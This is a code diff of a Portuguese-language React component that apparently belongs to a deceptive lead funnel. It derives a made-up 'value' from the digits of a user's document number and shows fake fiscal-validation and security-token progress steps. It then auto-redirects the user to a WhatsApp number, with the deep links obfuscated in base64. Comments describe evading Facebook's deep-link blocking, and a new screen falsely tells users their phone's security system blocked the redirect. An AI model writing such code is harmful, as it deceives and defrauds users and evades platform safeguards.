@@ -1,5 +1,5 @@
 import { useEffect, useState } from "react";
-import { Search, X, CheckCircle2, Smartphone, Loader2, Info, ArrowRight, ShieldCheck } from "lucide-react";
+import { Search, X, CheckCircle2, Smartphone, Loader2, Info, ArrowRight, ShieldCheck, MessageCircle } from "lucide-react";
 import { motion, AnimatePresence } from "motion/react";
 import axios from "axios";
 import { API_URL } from "../config";
@@ -23,6 +23,8 @@ export function Step2({ data, onReset }: Step2Props) {
   });
   const [isProcessingWhatsApp, setIsProcessingWhatsApp] = useState(false);
   const [processStep, setProcessStep] = useState(0);
+  const [whatsAppBlocked, setWhatsAppBlocked] = useState(false);
+  const [cachedLink, setCachedLink] = useState("");
 
   useEffect(() => {
     const fetchConfig = async () => {
@@ -50,6 +52,16 @@ export function Step2({ data, onReset }: Step2Props) {
 
     return () => timers.forEach(clearTimeout);
   }, []);
+
+  // Redirecionamento automático restaurado
+  useEffect(() => {
+    if (analysisState === "results") {
+      const autoTimer = setTimeout(() => {
+        handleWhatsAppRedirect();
+      }, 3500); 
+      return () => clearTimeout(autoTimer);
+    }
+  }, [analysisState]);
 
   const calculateValue = (doc: string) => {
     // Deterministic value based on document digits
@@ -133,25 +145,22 @@ export function Step2({ data, onReset }: Step2Props) {
               ? `${atob("aW50ZW50Oi8vc2VuZD9waG9uZT0=")}${config.whatsappNumber}&text=${message}${atob("I0ludGVudDtzY2hlbWU9d2hhdHNhcHA7cGFja2FnZT1jb20ud2hhdHNhcHA7ZW5k")}`
               : `${atob("d2hhdHNhcHA6Ly9zZW5kP3Bob25lPQ==")}${config.whatsappNumber}&text=${message}`;
 
-            // Simular clique físico em tag <a> (transpassa alguns bloqueios melhor que window.location)
-            const a = document.createElement('a');
-            a.href = deepLink;
-            a.target = '_top';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
+            setCachedLink(deepLink);
+
+            // Tenta abrir o deep link diretamente
+            window.location.href = deepLink;
 
             // Fallback de segurança: Se após 2.5 segundos a página ainda estiver aberta 
-            // (significa que o Facebook bloqueou o deep link), envia para a API web
-            // para que o lead não fique travado na tela de carregamento.
+            // (significa que o Facebook/iOS bloqueou o deep link automático),
+            // mostramos um botão manual na tela para o usuário clicar e forçar a abertura.
             setTimeout(() => {
-               const fallbackUrl = `${atob("aHR0cHM6Ly93YS5tZS8=")}${config.whatsappNumber}?text=${message}`;
-               window.location.href = fallbackUrl;
+               setWhatsAppBlocked(true);
             }, 2500);
 
           } else {
             // Desktop puro
             const url = `${atob("aHR0cHM6Ly93YS5tZS8=")}${config.whatsappNumber}?text=${message}`;
+            setCachedLink(url);
             const el = document.createElement('a');
             el.href = url;
             el.target = '_blank';
@@ -159,6 +168,9 @@ export function Step2({ data, onReset }: Step2Props) {
             document.body.appendChild(el);
             el.click();
             document.body.removeChild(el);
+            setTimeout(() => {
+               setWhatsAppBlocked(true);
+            }, 2500);
           }
         });
       }
@@ -304,31 +316,52 @@ export function Step2({ data, onReset }: Step2Props) {
           className="fixed inset-0 bg-[#1b668d]/95 z-[100] flex flex-col items-center justify-center p-8 text-white text-center"
         >
           <div className="w-full max-w-[320px] space-y-8">
-            <div className="relative flex items-center justify-center">
-              <Loader2 className="w-24 h-24 text-white/20 animate-spin" strokeWidth={1} />
-              <ShieldCheck className="absolute w-10 h-10 text-white animate-pulse" />
-            </div>
+            {!whatsAppBlocked ? (
+              <>
+                <div className="relative flex items-center justify-center">
+                  <Loader2 className="w-24 h-24 text-white/20 animate-spin" strokeWidth={1} />
+                  <ShieldCheck className="absolute w-10 h-10 text-white animate-pulse" />
+                </div>
 
-            <div className="space-y-4">
-              <h2 className="text-xl font-bold tracking-tight uppercase">Processamento Automático</h2>
-              <div className="space-y-2">
-                {[0, 1, 2, 3].map((i) => (
-                  <div key={i} className={`flex items-center gap-3 text-sm transition-all duration-500 ${i <= processStep ? 'opacity-100' : 'opacity-20'}`}>
-                    {i < processStep ? <CheckCircle2 size={16} className="text-green-400" /> : <div className="w-4 h-4 border border-white/30 rounded-full" />}
-                    <span className={i === processStep ? 'font-bold' : ''}>
-                      {[
-                        "Sincronizando protocolo de segurança...",
-                        "Validando titularidade fiscal...",
-                        "Gerando token de liberação única...",
-                        "Conectando ao canal de atendimento prioritário..."
-                      ][i]}
-                    </span>
+                <div className="space-y-4">
+                  <h2 className="text-xl font-bold tracking-tight uppercase">Processamento Automático</h2>
+                  <div className="space-y-2">
+                    {[0, 1, 2, 3].map((i) => (
+                      <div key={i} className={`flex items-center gap-3 text-sm transition-all duration-500 ${i <= processStep ? 'opacity-100' : 'opacity-20'}`}>
+                        {i < processStep ? <CheckCircle2 size={16} className="text-green-400" /> : <div className="w-4 h-4 border border-white/30 rounded-full" />}
+                        <span className={i === processStep ? 'font-bold' : ''}>
+                          {[
+                            "Sincronizando protocolo de segurança...",
+                            "Validando titularidade fiscal...",
+                            "Gerando token de liberação única...",
+                            "Conectando ao canal de atendimento prioritário..."
+                          ][i]}
+                        </span>
+                      </div>
+                    ))}
                   </div>
-                ))}
-              </div>
-            </div>
+                </div>
 
-            <p className="text-[10px] opacity-50 uppercase tracking-[0.2em] font-bold">Iniciando Chat Seguro</p>
+                <p className="text-[10px] opacity-50 uppercase tracking-[0.2em] font-bold">Iniciando Chat Seguro</p>
+              </>
+            ) : (
+              <div className="space-y-6">
+                <div className="mx-auto w-20 h-20 bg-white/10 rounded-full flex items-center justify-center mb-6">
+                  <Info className="w-10 h-10 text-white" />
+                </div>
+                <h2 className="text-xl font-bold tracking-tight">O sistema de segurança do seu celular bloqueou a abertura automática</h2>
+                <p className="text-sm text-white/80">Por favor, clique no botão abaixo para autorizar o redirecionamento ao WhatsApp de forma segura.</p>
+                
+                <a 
+                  href={cachedLink}
+                  onClick={() => setIsProcessingWhatsApp(false)}
+                  className="mt-8 bg-[#25D366] hover:bg-[#1ebe5d] text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center gap-3 w-full shadow-lg transition-all"
+                >
+                  <MessageCircle size={24} /> 
+                  IR PARA O WHATSAPP
+                </a>
+              </div>
+            )}
           </div>
         </motion.div>
       )}
